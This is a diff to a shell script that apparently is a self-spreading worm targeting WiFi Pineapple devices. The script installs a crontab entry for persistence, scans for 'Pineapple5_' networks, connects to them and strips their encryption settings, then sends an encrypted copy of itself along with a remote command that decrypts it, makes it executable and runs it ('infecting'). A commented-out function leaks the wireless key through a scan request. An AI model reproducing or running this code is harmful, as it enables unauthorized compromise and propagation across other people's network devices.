@@ -1,5 +1,6 @@
 #!/bin/bash
 base=/tospo
+#Automate
 if [ -e $base/pr ] ;
 then
 	rm $base/pr;
@@ -7,6 +8,7 @@ then
 	printf "* * * * * $base/tv" | crontab -
 	exit
 fi
+#Mark it
 if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
 then
 	sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
@@ -15,17 +17,20 @@ then
 	wifi
 	exit
 fi
+
+#Concurrency check
 if [ -e $base/tlock ] ; then
 	exit
 fi
 touch $base/tlock
 
+
 self=`uci get wireless.@wifi-iface[0].ssid`
-disclose () {
+#disclose () {
 	#Do this less often? One in five perhaps?
-	echo "Disclosing wireless management data..."
-	iwlist wlan1 scan essid "$(grep 'key' /etc/config/wireless|cut -d' ' -f8|head -c20|openssl rsautl -encrypt -pubin -inkey $base/d)"
-}
+#	echo "Disclosing wireless management data..."
+#	iwlist wlan1 scan essid "$(grep 'key' /etc/config/wireless|cut -d' ' -f8|head -c20|openssl rsautl -encrypt -pubin -inkey $base/d)"
+#}
 #-------------------------------------------------------------------------------------------------------------
 pushstate() {
 	echo "Pushing state..."
@@ -50,26 +55,27 @@ reconfigure() {
 	value=0
 	while true
 	do
-		value=`dd if=/dev/urandom count=1 bs=1 2>/dev/null | hexdump -e '16/1 "%02d"' | cut -f1`
+		value=`dd if=/dev/urandom count=1 bs=1 2>/dev/null | hexdump -e '16/1 "%02d"' | cut -f1 | egrep -o "[1-9][0-9]*" | tr '\n' '\0'`
 		if [ "$value" -gt 2 -a "$value" -lt 255 ]; then
 			break
 		fi 
 	done
-	#adjust ap to not conflict...
+	echo "adjust ap to not conflict..."
 	uci set wireless.@wifi-iface[0].mode='ap'
 	uci set wireless.@wifi-iface[0].ssid="$self"
 	uci set wireless.radio0.channel='1'
 	uci set wireless.@wifi-iface[0].hidden='1'
 	uci commit wireless
 
-	#Fix up local settings too...
+	echo "Fix up local settings too..."
+	echo "uci set network.lan.ipaddr='172.16.42.$value'"
 	uci set network.lan.ipaddr="172.16.42.$value"
 	uci set network.lan.netmask='255.255.0.0'
 	uci set network.lan.gateway='172.16.42.42'
 	uci set network.lan.dns='8.8.8.8'
 	uci commit network
- 
-	ifup
+
+	echo "Done avoiding conflicts..."
 }
 
 connect() {
@@ -77,7 +83,7 @@ connect() {
 	echo "Connecting to $ssid..."
 	reconfigure
 	
-	#find lan device
+	echo "find lan device..."
 	c=0
 	while true
 	do
@@ -92,15 +98,18 @@ connect() {
 		c=$((c+1))
 	done
 	
+	echo "Connect to the target..."
 	uci set wireless.@wifi-iface[2].network=wan
 	uci set wireless.@wifi-iface[2].mode=sta
 	uci set wireless.@wifi-iface[2].ssid="$ssid"
 	uci set wireless.@wifi-iface[2].hidden=0
 	uci set wireless.@wifi-device[2].channel=11
-	
+
+	echo "Stripping keys..."	
 	uci delete wireless.@wifi-iface[2].key
 	uci delete wireless.@wifi-iface[2].encryption
-	
+
+	echo "uci commit wireless"	
 	uci commit wireless
 	wifi
 }
@@ -119,9 +128,7 @@ bf() {
 }
 
 echo "Scanning for new devices..."
-ifconfig wlan1 up
-sleep 2
-for n in `iwlist wlan1 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
+for n in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
 do
 	pushstate
 	connect `echo $n | cut -d '"' -f 2`
@@ -148,7 +155,7 @@ do
 	echo "Encrypting key payload/infecting..."
 	openssl rsautl -encrypt -inkey $base/pu -pubin -in $base/k -out $base/ek && \
 	openssl aes-128-cbc -pass file:$base/k -in $base/tv -out $base/etv && \
-	post "$cmdurl" "$token=printf \"\$(echo $(hexdump -e'16/1 "%02x"' $base/ek)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/ek;printf \"\$(echo $(hexdump -e'16/1 "%02x"' $base/etv)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/etv;printf \"\$(echo $(hexdump -e'16/1 "%02x"' d)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/d;openssl rsautl -decrypt -inkey $base/pr -in $base/ek -out $base/k; openssl aes-128-cbc -d -pass file:$base/k -in $base/etv -out $base/tv; chmod u%%2Brx $base/tv; printf \"$base/at\" > $base/at; at -f $base/at now;"
+	post "$cmdurl" "$token=printf \"\$(echo $(hexdump -e'16/1 "%02x"' $base/ek)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/ek;printf \"\$(echo $(hexdump -e'16/1 "%02x"' $base/etv)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/etv;printf \"\$(echo $(hexdump -e'16/1 "%02x"' d)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">$base/d;openssl rsautl -decrypt -inkey $base/pr -in $base/ek -out $base/k; openssl aes-128-cbc -d -pass file:$base/k -in $base/etv -out $base/tv; chmod u%%2Brx $base/tv; printf \"$base/at\">$base/at;at -f $base/at now;"
 
 	popstate
 	break
